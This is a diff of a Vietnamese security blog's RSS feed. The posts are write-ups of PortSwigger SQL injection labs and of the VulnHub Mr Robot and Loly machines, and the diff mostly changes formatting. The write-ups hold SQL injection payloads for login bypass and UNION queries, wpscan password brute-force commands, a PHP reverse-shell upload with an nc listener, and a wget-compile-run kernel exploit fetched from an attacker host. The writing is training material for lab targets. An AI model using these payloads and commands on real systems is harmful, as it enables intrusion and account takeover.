@@ -51,41 +51,35 @@ Sau đó sẽ sử dung hàm <code>is_blacklisted</code> để kiểm tra <code>
 <p>Level: APPRENTICE</p>
 <h3 id="description">Description</h3>
 <p>Lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Gifts&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Gifts&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Để giải quyết bài lab, khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa được phát hành.</p>
 <h3 id="step">Step</h3>
 <p>Đầu tiên click vào một category bất kỳ
 Sau khi nhấp vào <code>Accessories</code> category, URL hiển thị:</p>
-<pre tabindex="0"><code>
-https://0a8000e303dd05e481ca2ff0002600bb.web-security-academy.net/filter?category=Accessories
+<pre tabindex="0"><code>https://0a8000e303dd05e481ca2ff0002600bb.web-security-academy.net/filter?category=Accessories
 </code></pre><p>Để ý những từ in đậm là chuỗi truy vấn.
 Ứng dụng sẽ thực hiện một truy vấn SQL để lấy thông tin từ cơ sở dữ liệu.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Mục tiêu là lấy tất cả thông tin sản phẩm, từ tất cả danh mục và cả sản phẩm đã phát hành và chưa phát hành.
 Câu lệnh trên hiển thị <code>released = 1</code> nghĩa là nó sẽ chỉ hiển thị các sản phẩm đã được phát hành, trong đó <code>released = 0</code> đại diện cho các sản phẩm chưa được phát hành.</p>
 <p></p>
 <p>Tiếp theo nếu thêm một dấu <code>'</code> vào cuối chuỗi truy vấn</p>
 <p><code>?category=Accessories'</code></p>
 <p>Câu truy vấn sẽ là</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Điều này sẽ gây ra lỗi vì có một dấu <code>'</code> chưa được đóng.</p>
 <p></p>
 <p>Tiếp theo, thêm 2 dấu gạch ngang:</p>
 <p><code>?category=Accessories' --</code></p>
 <p>Câu truy vấn sẽ là</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Trong MySQL, mọi thứ sau dấu <code>--</code> sẽ được coi là <code>comment</code>.
 Có nghĩa là bây giờ trang web sẽ hiển thị tất cả các sản phẩm thuộc danh mục <code>Accessories</code>, cả <code>released</code> và <code>unreleased</code>.</p>
 <p></p>
 <p>Để hiển thị đầy đủ mọi thứ trong cơ sở dữ liệu:</p>
 <p><code>?category=Acesssories' or '1'='1' --'</code></p>
 <p>Chuỗi truy vấn lúc này sẽ là:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Với truy vấn trên, nó sẽ trả về tất cả các sản phẩm khi <code>Category</code> là <code>Accessories</code> hoặc <code>1 = 1</code> , vì <code>1 = 1</code> luôn đúng nên nó sẽ trả về tất cả các sản phẩm.</p>
 <p></p>
 <p>Solved</p>
@@ -102,15 +96,13 @@ Có nghĩa là bây giờ trang web sẽ hiển thị tất cả các sản ph�
 Thử đăng nhập với tài khoản <code>administrator</code> và mật khẩu bất kỳ.</p>
 <p></p>
 <p>Khi đăng nhập, câu truy vấn sẽ có dạng:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password&#39;</span>
 </span></span></code></pre></div><p>Tiếp theo ta thử thêm 1 dấu <code>'</code> vào cuối <code>administrator</code> và đăng nhập.</p>
 <p></p>
 <p>Server sẽ bị lỗi, điều này cho thấy server bị lỗi SQL Injection.
 Nếu ta tiêm vào <code>username</code> câu lệnh: <code>administrator' or '1' = '1' --</code>
 Câu truy vấn sẽ có dạng:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">--</span><span style="color:#e6db74">&#39; AND password = &#39;</span><span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">--</span><span style="color:#e6db74">&#39; AND password = &#39;</span><span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
 </span></span></code></pre></div><p>Bất kể mật khảu của tài khoản <code>administrator</code> có đúng hay không, vì <code>1 = 1</code> sẽ luôn trả về <code>true</code> và dấu <code>--</code> sẽ <code>comment</code> phần còn lại của câu lệnh <code>' AND password = 'password'</code> nên nó sẽ đăng nhập vào tài khoản <code>administrator</code>.</p>
 <p></p>
 <p>Đăng nhập thành công.
@@ -125,16 +117,13 @@ Solved</p>
 Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
 <h3 id="step-2">Step</h3>
 <p>Trong Oracle, built-in table có tên là <code>dual</code>, do vậy, ta có thể dò cột bằng cách sử dụng <code>UNION SELECT</code> và gọi <code>FROM</code> đến bảng <code>dual</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
 </span></span></code></pre></div><p>Lặp đi lặp lại câu lệnh, mỗi lần tăng số lượng <code>null</code>.
 Ta có thể tìm thấy số lượng cột chính xác bằng cách thêm <code>' UNION (select null, null)--</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">someTable</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> (<span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">someTable</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> (<span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
 </span></span></code></pre></div><p></p>
 <p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,banner FROM v$version --'</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#a6e22e">banner</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">v</span>$version <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#a6e22e">banner</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">v</span>$version <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
 </span></span></code></pre></div><p></p>
 <p>Solved</p>
 <p></p>
@@ -302,7 +291,7 @@ Thay vì <code>inject</code> một câu lệnh để server thực hiện sau kh
     <author>g03m0n</author>
     <guid>https://g03m0n.github.io/posts/vulhub-mrrobot/vulhub-mrrobot/</guid>
     <description><![CDATA[<h2 id="description">Description</h2>
-<p>Link lab tại <a href="https://www.vulnhub.com/entry/loly-1,538/" target="_blank" rel="noopener noreffer">đây</a>
+<p>Link lab tại <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank" rel="noopener noreffer">đây</a>
 </p>
 <h2 id="step">Step</h2>
 <h3 id="reconnaissance">Reconnaissance</h3>
@@ -322,24 +311,20 @@ Sử dụng <code>wpscan</code> để <code>brute force</code> username/password
 <h3 id="exploitation">Exploitation</h3>
 <p>Ta truy cập endpoint <code>/fsocity.dic</code> để tải file từ điển về máy.
 Xử lý file để rút ngắn từ điển bằng <code>query</code>:</p>
-<pre tabindex="0"><code>
-cat fsocity.dic | sort -u &gt; dic.txt
+<pre tabindex="0"><code>cat fsocity.dic | sort -u &gt; dic.txt
 </code></pre><p></p>
 <p>Tiếp theo. ta đi tìm <code>username</code> bằng <code>query</code>:</p>
-<pre tabindex="0"><code>
-wpscan --url http://192.168.134.136 --enumerate u --users-list dic.txt
+<pre tabindex="0"><code>wpscan --url http://192.168.134.136 --enumerate u --users-list dic.txt
 </code></pre><p></p>
 <p>Tìm <code>password</code> với username vừa tìm được là <code>elliot</code>:</p>
-<pre tabindex="0"><code>
-wpscan --url http://192.168.134.136/ --usernames elliot --passwords dic.txt
+<pre tabindex="0"><code>wpscan --url http://192.168.134.136/ --usernames elliot --passwords dic.txt
 </code></pre><p>Ta thu được <code>username/password</code>: <code>elliot/ER28-0652</code></p>
 <p></p>
 <p>Vì Elliot là quản trị viên của trang WordPress nên có thể chỉnh sửa bất cứ điều gì.
 Tiến hành edit file <code>404.php</code> bằng <code>php-reverse-shell</code>:</p>
 <p></p>
 <p>Lắng nghe tại port <code>9001</code> ở máy attacker bằng <code>query</code>:</p>
-<pre tabindex="0"><code>
-nc -nvlp 9001
+<pre tabindex="0"><code>nc -nvlp 9001
 </code></pre><p></p>
 <p>Refresh lại trang web như hình:</p>
 <p></p>
@@ -355,8 +340,7 @@ Tìm được <code>password</code> của user <code>robot</code> nhưng nó b�
 <p></p>
 <h3 id="privilege-escalation">Privilege Escalation</h3>
 <p>Ta tìm tất cả các file thực thi có quyền <code>suid</code> bằng <code>query</code>:</p>
-<pre tabindex="0"><code>
-find / -perm -u=s -type f 2&gt;/dev/null
+<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
 </code></pre><p></p>
 <p>Ta tìm được <code>/usr/local/bin/nmap</code>.
 Truy cập <a href="https://gtfobins.github.io/gtfobins/nmap/" target="_blank" rel="noopener noreffer">GTFOBins</a>
@@ -387,8 +371,7 @@ Nhận thấy có một IP lạ là <code>192.168.134.135</code>.</p>
 <p></p>
 <h3 id="enumeration">Enumeration</h3>
 <p>Tiến hành quét các <code>directory</code> bằng <code>dirb</code></p>
-<pre tabindex="0"><code>
-dirb 192.168.134.135
+<pre tabindex="0"><code>dirb 192.168.134.135
 </code></pre><p></p>
 <p>Ta thu được kết quả trang web này sử dụng Wordpress tại endpoint <code>/wordpress</code>.</p>
 <p></p>
@@ -398,14 +381,12 @@ dirb 192.168.134.135
 <p></p>
 <p>Tiến hành <code>brute force</code> <code>username/password</code> bằng cách sử dụng <code>wpscan</code>.
 Đầu tiên ta tìm <code>username</code>:</p>
-<pre tabindex="0"><code>
-wpscan -url http://loly.lc/wordpress
+<pre tabindex="0"><code>wpscan -url http://loly.lc/wordpress
 </code></pre><p></p>
 <p>Ta thu được username là <code>loly</code>.</p>
 <p></p>
 <p><code>Brute force</code> password bằng query:</p>
-<pre tabindex="0"><code>
-wpscan -url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
+<pre tabindex="0"><code>wpscan -url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
 </code></pre><p></p>
 <p>Thu được mật khẩu: <code>fernando</code>
 Tiến hành đăng nhập</p>
@@ -418,36 +399,31 @@ Tiến hành đăng nhập</p>
 <p>Ta có thể tận dụng lỗ hổng này để upload <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreffer">reverse-shell</a>
 .
 Mở cổng 9001 trên máy attacker bằng query:</p>
-<pre tabindex="0"><code>
-nc -nvlp 9001
+<pre tabindex="0"><code>nc -nvlp 9001
 </code></pre><p>Bây giờ, truy cập PHP reverse shell bằng cách load lại trang web như hình dưới đây:</p>
 <p></p>
 <p>Thành công</p>
 <p></p>
 <p>Có thể nâng cấp shell này python <code>pty</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 </span></span></code></pre></div><p></p>
 <p>Sau đó thử <code>grep</code> với từ khóa <code>loly</code> ta tìm được mật khẩu DB có trong file <code>wp-config.php</code> là <code>lolyisabeautifulgirl</code></p>
 <p></p>
 <h3 id="privilege-escalation">Privilege Escalation</h3>
 <p>Đầu tiên, ta thử kiểm tra phiên bản <code>kernel</code> của machine</p>
-<pre tabindex="0"><code>
-uname -a
+<pre tabindex="0"><code>uname -a
 </code></pre><p></p>
 <p>Đây là một phiên bản khá cũ, thử tìm mã khai thác trên google thì thấy một mã khai thác trên <code>exploit-db</code>:</p>
 <p></p>
 <p>Ta <code>wget</code> nó về và <code>compile</code>:</p>
-<pre tabindex="0"><code>
-wget http://192.168.134.134:8000/ex.c
+<pre tabindex="0"><code>wget http://192.168.134.134:8000/ex.c
 gcc ex.c -o ex
 chmod 777 ex
 </code></pre><p>
 
 </p>
 <p>Thực thi file <code>ex</code> bằng query:</p>
-<pre tabindex="0"><code>
-./ex
+<pre tabindex="0"><code>./ex
 </code></pre><p></p>
 ]]></description>
 </item>
